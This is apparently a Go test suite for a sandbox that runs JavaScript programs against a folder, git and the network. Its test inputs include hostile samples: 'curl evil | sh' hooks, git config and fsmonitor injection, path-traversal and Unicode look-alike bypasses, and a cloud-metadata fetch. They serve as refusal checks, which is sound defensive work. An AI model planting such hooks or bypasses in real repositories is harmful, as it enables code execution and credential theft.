package carried

import (
	"bytes"
	"context"
	"encoding/json"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/panphora/htmlclay/internal/egress"
)

// probe runs a program that makes each call in calls (JavaScript
// expressions) and answers, per call, its value or its error code.
func probe(t *testing.T, job Job, calls map[string]string) map[string]any {
	t.Helper()
	src := "async function main() { const out = {};\n"
	for name, expr := range calls {
		src += "try { out[" + jsString(name) + "] = { value: await " + expr + " }; } catch (e) { out[" + jsString(name) + "] = { code: e.code || String(e) }; }\n"
	}
	src += "return out; }"
	job.Modules = map[string]string{"main": src}
	res, err := runJob(t, job)
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	var out map[string]map[string]any
	if err := json.Unmarshal(res.Data, &out); err != nil {
		t.Fatal(err)
	}
	got := map[string]any{}
	for name, r := range out {
		if c, ok := r["code"]; ok {
			got[name] = c
		} else {
			got[name] = r["value"]
		}
	}
	return got
}

func jsString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func folderWithFiles(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	outside := t.TempDir()
	must(t, os.WriteFile(filepath.Join(dir, "a.txt"), []byte("hello"), 0o644))
	must(t, os.MkdirAll(filepath.Join(dir, "sub"), 0o755))
	must(t, os.WriteFile(filepath.Join(dir, "sub", "b.txt"), []byte("deeper"), 0o644))
	must(t, os.MkdirAll(filepath.Join(dir, ".git"), 0o755))
	must(t, os.WriteFile(filepath.Join(dir, ".git", "config"), []byte("[remote]\n\turl = https://me:token@example.com/r.git\n"), 0o644))
	must(t, os.MkdirAll(filepath.Join(dir, ".hg"), 0o755))
	must(t, os.WriteFile(filepath.Join(dir, ".hg", "hgrc"), []byte("[auth]\nx.password = token\n"), 0o644))
	must(t, os.MkdirAll(filepath.Join(dir, ".vscode"), 0o755))
	must(t, os.WriteFile(filepath.Join(dir, ".vscode", "tasks.json"), []byte("{}"), 0o644))
	must(t, os.WriteFile(filepath.Join(outside, "secret.txt"), []byte("not yours"), 0o644))
	if runtime.GOOS != "windows" {
		must(t, os.Symlink(".git", filepath.Join(dir, "gitlink")))
		must(t, os.Symlink(outside, filepath.Join(dir, "out")))
		must(t, os.Symlink(filepath.Join(outside, "secret.txt"), filepath.Join(dir, "secret-link")))
		must(t, mkfifo(filepath.Join(dir, "pipe")))
	}
	return dir
}

func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}

func TestFileCallsStayInsideTheFolder(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("links and named pipes are planted with Unix calls")
	}
	dir := folderWithFiles(t)
	got := probe(t, Job{Folder: dir, Calls: Calls{Files: true, Git: true}}, map[string]string{
		"plain":       `clay.files.read("a.txt")`,
		"nested":      `clay.files.read("./sub/b.txt")`,
		"climb":       `clay.files.read("../a.txt")`,
		"climb-deep":  `clay.files.read("sub/../../a.txt")`,
		"absolute":    `clay.files.read("/etc/hosts")`,
		"link-dir":    `clay.files.read("out/secret.txt")`,
		"link-file":   `clay.files.read("secret-link")`,
		"dot-git":     `clay.files.read(".git/config")`,
		"git-case":    `clay.files.read(".GIT/config")`,
		"git-dot":     `clay.files.read(".git./config")`,
		"git-hidden":  `clay.files.read(".g\u200cit/config")`,
		"git-short":   `clay.files.read("GIT~1/config")`,
		"git-link":    `clay.files.read("gitlink/config")`,
		"list-git":    `clay.files.list("gitlink")`,
		"dot-hg":      `clay.files.read(".hg/hgrc")`,
		"dot-svn":     `clay.files.read(".ſvn/entries")`,
		"tasks":       `clay.files.read(".vscode/tasks.json")`,
		"pipe":        `clay.files.read("pipe")`,
		"list-link":   `clay.files.list("out")`,
		"list-root":   `clay.files.list(".").then((l) => l.map((e) => e.name + ":" + e.type).join(","))`,
		"missing":     `clay.files.read("nope.txt")`,
		"write-level": `clay.files.write("new.txt", "x")`,
	})
	want := map[string]any{
		"plain": "hello", "nested": "deeper", "climb": CodeCallRefused, "climb-deep": CodeCallRefused,
		"absolute": CodeCallRefused, "link-dir": CodeCallRefused, "link-file": CodeNotAFile, "dot-git": CodeCallRefused,
		"git-case": CodeCallRefused, "git-dot": CodeCallRefused, "git-hidden": CodeCallRefused, "git-short": CodeCallRefused, "git-link": CodeCallRefused,
		"list-git": CodeNotFound, "dot-hg": CodeCallRefused, "dot-svn": CodeCallRefused, "tasks": "{}",
		"pipe": CodeNotAFile, "list-link": CodeNotFound, "missing": CodeNotFound, "write-level": CodeCallRefused,
		"list-root": ".vscode:folder,a.txt:file,gitlink:link,out:link,pipe:other,secret-link:link,sub:folder",
	}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s = %v, want %v", k, got[k], w)
		}
	}
	if _, err := os.Stat(filepath.Join(dir, "new.txt")); err == nil {
		t.Error("a read level program wrote a file")
	}
}

func TestWritesStayInsideTheFolderAndOutOfGit(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("links are planted with Unix calls")
	}
	dir := folderWithFiles(t)
	parent := filepath.Dir(dir)
	got := probe(t, Job{Folder: dir, Calls: Calls{Files: true, Git: true, Write: true}}, map[string]string{
		"new":        `clay.files.write("sub/new.txt", "made").then((r) => r.bytes)`,
		"replace":    `clay.files.write("a.txt", "changed").then((r) => r.path)`,
		"hook":       `clay.files.write(".git/hooks/pre-commit", "#!/bin/sh\necho owned")`,
		"git-link":   `clay.files.write("gitlink/config", "[core]\n\tfsmonitor = owned\n")`,
		"git-short":  `clay.files.write("GIT~1/config", "x")`,
		"tasks":      `clay.files.write(".vscode/tasks.json", "{}")`,
		"hooks":      `clay.files.write(".claude/settings.json", "{}")`,
		"workflow":   `clay.files.write(".github/workflows/ci.yml", "on: push")`,
		"attributes": `clay.files.write(".gitattributes", "* filter=x")`,
		"husky":      `clay.files.write(".husky/pre-commit", "curl evil | sh")`,
		"tasks-fold": `clay.files.write(".vſcode/tasks.json", "{}")`,
		"husky-fold": `clay.files.write(".huſky/pre-commit", "curl evil | sh")`,
		"flow-fold":  `clay.files.write(".github/workﬂows/ci.yml", "on: push")`,
		"climb":      `clay.files.write("../escape.txt", "x")`,
		"link-dir":   `clay.files.write("out/planted.txt", "x")`,
		"link-deep":  `clay.files.write("out/made/planted.txt", "x")`,
		"link-file":  `clay.files.write("secret-link", "x")`,
		"new-folder": `clay.files.write("made/deeper/x.txt", "x").then((r) => r.path)`,
	})
	want := map[string]any{"new": float64(4), "replace": "a.txt", "hook": CodeCallRefused, "git-link": CodeCallRefused,
		"git-short": CodeCallRefused, "tasks": CodeCallRefused, "hooks": CodeCallRefused, "workflow": CodeCallRefused,
		"attributes": CodeCallRefused, "husky": CodeCallRefused, "tasks-fold": CodeCallRefused, "husky-fold": CodeCallRefused,
		"flow-fold": CodeCallRefused, "climb": CodeCallRefused, "link-dir": CodeCallRefused, "link-deep": CodeCallRefused,
		"link-file": CodeNotAFile, "new-folder": "made/deeper/x.txt"}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s = %v, want %v", k, got[k], w)
		}
	}
	if data, _ := os.ReadFile(filepath.Join(dir, "a.txt")); string(data) != "changed" {
		t.Errorf("a.txt = %q", data)
	}
	for _, p := range []string{filepath.Join(parent, "escape.txt"), filepath.Join(dir, ".git", "hooks", "pre-commit"),
		filepath.Join(dir, ".claude"), filepath.Join(dir, ".github"), filepath.Join(dir, ".gitattributes"), filepath.Join(dir, ".husky")} {
		if _, err := os.Stat(p); err == nil {
			t.Errorf("%s was written", p)
		}
	}
	if data, _ := os.ReadFile(filepath.Join(dir, ".git", "config")); strings.Contains(string(data), "owned") {
		t.Error("a link inside the folder let a program write .git/config")
	}
	if data, _ := os.ReadFile(filepath.Join(dir, ".vscode", "tasks.json")); string(data) != "{}" {
		t.Errorf(".vscode/tasks.json = %q", data)
	}
	if data, _ := os.ReadFile(filepath.Join(dir, "made", "deeper", "x.txt")); string(data) != "x" {
		t.Errorf("a write into new folders left %q", data)
	}
	if data, _ := os.ReadFile(filepath.Join(dir, "secret-link")); string(data) != "not yours" {
		t.Errorf("the file behind a link changed to %q", data)
	}
	entries, _ := filepath.Glob(filepath.Join(dir, "*", ".clay-write-*"))
	if more, _ := filepath.Glob(filepath.Join(dir, ".clay-write-*")); len(entries)+len(more) > 0 {
		t.Errorf("left temporary files %v %v", entries, more)
	}
}

func TestGitRunsNoProgramTheRepositoryNames(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the planted programs are shell scripts")
	}
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git is not installed")
	}
	dir := t.TempDir()
	marker := filepath.Join(t.TempDir(), "ran")
	plant := "#!/bin/sh\ntouch " + marker + "\n"
	gitCmd := func(args ...string) {
		cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
		cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	gitCmd("init", "-q", "-b", "main")
	gitCmd("config", "user.email", "t@example.com")
	gitCmd("config", "user.name", "T")
	must(t, os.WriteFile(filepath.Join(dir, "f.txt"), []byte("one\n"), 0o644))
	gitCmd("add", ".")
	gitCmd("commit", "-q", "-m", "one")
	gitCmd("checkout", "-q", "-b", "work")
	must(t, os.WriteFile(filepath.Join(dir, "f.txt"), []byte("two\n"), 0o644))
	must(t, os.WriteFile(filepath.Join(dir, ".gitattributes"), []byte("*.txt diff=planted filter=planted\n"), 0o644))
	gitCmd("add", ".")
	gitCmd("commit", "-q", "-m", "two")
	program := filepath.Join(t.TempDir(), "planted")
	must(t, os.WriteFile(program, []byte(plant), 0o755))
	for _, kv := range [][2]string{{"core.fsmonitor", program}, {"diff.planted.command", program}, {"diff.planted.textconv", program},
		{"filter.planted.clean", program}, {"filter.planted.smudge", program}, {"core.hooksPath", filepath.Dir(program)}} {
		gitCmd("config", kv[0], kv[1])
	}
	must(t, os.WriteFile(filepath.Join(dir, "f.txt"), []byte("three\n"), 0o644))
	got := probe(t, Job{Folder: dir, Calls: Calls{Files: true, Git: true}}, map[string]string{
		"status":   `clay.git.status().then((s) => s.map((e) => e.path).join(","))`,
		"log":      `clay.git.log({ base: "main", head: "work" }).then((l) => l.map((c) => c.subject).join(","))`,
		"diff":     `clay.git.diff({ base: "main", head: "work" }).then((d) => d.files.map((f) => f.path).join(","))`,
		"show":     `clay.git.show("main", "f.txt")`,
		"branches": `clay.git.branches().then((b) => b.length)`,
		"option":   `clay.git.log({ base: "--output=/tmp/x", head: "work" })`,
		"recent":   `clay.git.log({ max: 1 }).then((l) => l.map((c) => c.subject).join(","))`,
		"from":     `clay.git.log({ head: "main" }).then((l) => l.map((c) => c.subject).join(","))`,
	})
	want := map[string]any{"status": "f.txt", "log": "two", "diff": ".gitattributes,f.txt", "show": "one\n", "branches": float64(2), "option": CodeCallInvalid,
		"recent": "two", "from": "one"}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s = %v, want %v", k, got[k], w)
		}
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("reading the repository ran a program it names")
	}
}

func TestFetchReachesOnlyPublicAddresses(t *testing.T) {
	private := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("private")) }))
	defer private.Close()
	front := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/hop" {
			http.Redirect(w, r, private.URL, http.StatusFound)
			return
		}
		w.Header().Add("Link", "<a>; rel=prev")
		w.Header().Add("Link", "<b>; rel=next")
		w.Write([]byte("public"))
	}))
	defer front.Close()
	frontAddr := front.Listener.Addr().String()
	// The front server stands in for a public site: only its exact address
	// skips the public check, and every other dial, including a redirect's,
	// goes through egress.DialPublic.
	job := Job{Calls: Calls{Fetch: true}, dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
		if addr == frontAddr {
			return (&net.Dialer{}).DialContext(ctx, network, addr)
		}
		return egress.DialPublic(ctx, network, addr)
	}}
	_, port, _ := net.SplitHostPort(private.Listener.Addr().String())
	got := probe(t, job, map[string]string{
		"front":     `clay.fetch(` + jsString(front.URL) + `).then((r) => r.text)`,
		"links":     `clay.fetch(` + jsString(front.URL) + `).then((r) => r.headers.link)`,
		"loopback":  `clay.fetch(` + jsString(private.URL) + `)`,
		"localhost": `clay.fetch("http://localhost:` + port + `/")`,
		"private":   `clay.fetch("http://10.0.0.1/")`,
		"link":      `clay.fetch("http://169.254.169.254/latest/meta-data/")`,
		"redirect":  `clay.fetch(` + jsString(front.URL+"/hop") + `)`,
		"file":      `clay.fetch("file:///etc/hosts")`,
		"files":     `clay.files.read("a.txt")`,
	})
	want := map[string]any{"front": "public", "links": "<a>; rel=prev, <b>; rel=next", "loopback": CodeFetchRefused, "localhost": CodeFetchRefused, "private": CodeFetchRefused,
		"link": CodeFetchRefused, "redirect": CodeFetchRefused, "file": CodeCallInvalid, "files": CodeCallRefused}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s = %v, want %v", k, got[k], w)
		}
	}
	if got := probe(t, Job{Calls: Calls{Fetch: true}}, map[string]string{"loopback": `clay.fetch(` + jsString(front.URL) + `)`}); got["loopback"] != CodeFetchRefused {
		t.Errorf("a run's own dialer reached loopback: %v", got["loopback"])
	}
}

// Each run has its own HTTP transport, which keeps idle connections with no
// time limit, so the run must close them or HTML Clay keeps a socket per run.
func TestARunLeavesNoConnectionOpen(t *testing.T) {
	closed := make(chan struct{}, 4)
	site := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("ok")) }))
	site.Config.ConnState = func(c net.Conn, state http.ConnState) {
		if state == http.StateClosed {
			closed <- struct{}{}
		}
	}
	site.Start()
	defer site.Close()
	job := Job{Calls: Calls{Fetch: true}, dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, addr)
	}}
	if got := probe(t, job, map[string]string{"site": `clay.fetch(` + jsString(site.URL) + `).then((r) => r.text)`}); got["site"] != "ok" {
		t.Fatalf("fetch = %v", got["site"])
	}
	select {
	case <-closed:
	case <-time.After(5 * time.Second):
		t.Fatal("the run ended and its connection to the site is still open")
	}
}

func TestInternetNeverComesWithFiles(t *testing.T) {
	for can, want := range map[string]Level{"": LevelRead, "read": LevelRead, "git": LevelRead, "read git": LevelRead, "CHANGE git": LevelChange, "internet": LevelInternet} {
		if got, err := ParseLevel(can); err != nil || got != want {
			t.Errorf("ParseLevel(%q) = %q, %v; want %q", can, got, err, want)
		}
	}
	for _, can := range []string{"read internet", "internet git", "change internet", "write", "root"} {
		if _, err := ParseLevel(can); code(err) != CodeProgramInvalid {
			t.Errorf("ParseLevel(%q) = %v, want it refused", can, err)
		}
	}
}

func TestPolicyGivesEachTierItsCalls(t *testing.T) {
	read := Calls{Files: true, Git: true}
	change := Calls{Files: true, Git: true, Write: true}
	internet := Calls{Fetch: true}
	cases := []struct {
		tier    string
		level   Level
		calls   Calls
		allowed bool
	}{
		{"mine", LevelRead, read, true},
		{"mine", LevelChange, change, true},
		{"ecosystem", LevelChange, change, true},
		{"team", LevelRead, read, true},
		{"team", LevelChange, Calls{}, false},
		{"unknown", LevelChange, Calls{}, false},
		{"unknown", LevelInternet, internet, true},
		{"mine", LevelInternet, internet, true},
	}
	for _, c := range cases {
		calls, allowed := Policy(c.tier, c.level)
		if calls != c.calls || allowed != c.allowed {
			t.Errorf("Policy(%s, %s) = %+v %v, want %+v %v", c.tier, c.level, calls, allowed, c.calls, c.allowed)
		}
	}
}

func TestAnArgumentThatIsNotAStringIsRefused(t *testing.T) {
	dir := folderWithFiles(t)
	got := probe(t, Job{Folder: dir, Calls: Calls{Files: true, Git: true, Write: true}, Put: func(name string, body []byte) (string, error) {
		return "clay://" + name, nil
	}}, map[string]string{
		"write-undefined":  `clay.files.write("a.txt", undefined)`,
		"write-null":       `clay.files.write("a.txt", null)`,
		"output-undefined": `clay.output("out", undefined)`,
		"list-object":      `clay.files.list({ path: "sub" })`,
		"read-number":      `clay.files.read(3)`,
		"list-null":        `clay.files.list(null).then((l) => Array.isArray(l) && l.length > 0)`,
	})
	want := map[string]any{"write-undefined": CodeCallInvalid, "write-null": CodeCallInvalid,
		"output-undefined": CodeCallInvalid, "list-object": CodeCallInvalid, "read-number": CodeCallInvalid, "list-null": true}
	for k, w := range want {
		if got[k] != w {
			t.Errorf("%s = %v, want %v", k, got[k], w)
		}
	}
	if data, _ := os.ReadFile(filepath.Join(dir, "a.txt")); string(data) != "hello" {
		t.Errorf("a.txt = %q: a refused write changed it", data)
	}
}

func TestAProgramReadsOnlyText(t *testing.T) {
	dir := t.TempDir()
	must(t, os.WriteFile(filepath.Join(dir, "latin1.txt"), []byte("Ren\xe9"), 0o644))
	must(t, os.WriteFile(filepath.Join(dir, "big.bin"), bytes.Repeat([]byte{0xff}, 3<<20), 0o644))
	must(t, os.WriteFile(filepath.Join(dir, "a.txt"), []byte("hello"), 0o644))
	got := probe(t, Job{Folder: dir, Calls: Calls{Files: true, Git: true}}, map[string]string{
		"latin1": `clay.files.read("latin1.txt")`,
		"binary": `clay.files.read("big.bin")`,
		"after":  `clay.files.read("a.txt")`,
	})
	if got["latin1"] != CodeNotText || got["binary"] != CodeNotText {
		t.Fatalf("latin1 = %v, binary = %v; want %s for both", got["latin1"], got["binary"], CodeNotText)
	}
	if got["after"] != "hello" {
		t.Fatalf("the read after a binary file = %v, want the worker still answering", got["after"])
	}
}

func TestGitShowRefusesABinaryFile(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git is not installed")
	}
	dir := t.TempDir()
	gitCmd := func(args ...string) {
		cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
		cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	gitCmd("init", "-q", "-b", "main")
	gitCmd("config", "user.email", "t@example.com")
	gitCmd("config", "user.name", "T")
	must(t, os.WriteFile(filepath.Join(dir, "bin.dat"), bytes.Repeat([]byte{0xff}, 64), 0o644))
	must(t, os.WriteFile(filepath.Join(dir, "text.txt"), []byte("one\n"), 0o644))
	gitCmd("add", ".")
	gitCmd("commit", "-q", "-m", "one")
	got := probe(t, Job{Folder: dir, Calls: Calls{Files: true, Git: true}}, map[string]string{
		"binary": `clay.git.show("main", "bin.dat")`,
		"text":   `clay.git.show("main", "text.txt")`,
	})
	if got["binary"] != CodeNotText {
		t.Errorf("git.show of a binary file = %v, want %s", got["binary"], CodeNotText)
	}
	if got["text"] != "one\n" {
		t.Errorf("git.show of a text file = %v, want the worker still answering", got["text"])
	}
}

func TestAFetchAnswerTooLargeForTheWorkerIsRefused(t *testing.T) {
	site := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/small" {
			w.Write([]byte("ok"))
			return
		}
		w.Write(bytes.Repeat([]byte{0x01}, 3<<20))
	}))
	defer site.Close()
	job := Job{Calls: Calls{Fetch: true}, dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, addr)
	}}
	got := probe(t, job, map[string]string{
		"big":   `clay.fetch(` + jsString(site.URL+"/big") + `).then((r) => r.text.length)`,
		"small": `clay.fetch(` + jsString(site.URL+"/small") + `).then((r) => r.text)`,
	})
	if got["big"] != CodeTooLarge {
		t.Errorf("a 3 MB answer = %v, want %s", got["big"], CodeTooLarge)
	}
	if got["small"] != "ok" {
		t.Errorf("the fetch after a too large answer = %v, want the worker still answering", got["small"])
	}
}
